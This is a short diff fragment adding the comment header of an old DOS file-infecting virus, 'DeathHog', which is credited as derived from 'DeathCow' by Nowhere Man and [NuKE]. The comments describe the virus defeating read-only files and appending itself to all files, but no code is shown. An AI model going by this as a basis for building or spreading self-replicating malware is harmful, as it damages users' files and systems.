@@ -1,0 +1,6 @@
+; DeathHog, (will defeat read-only files and appends itself to all
+; files)
+; Originally based upon DeathCow (C) 1991 by Nowhere Man and [NuKE] WaErZ 
+; r/w access, nuisance routines supplied by KOUCH
+;
+; Appended by Kouch, derived from DeathCow/Define (author unknown)
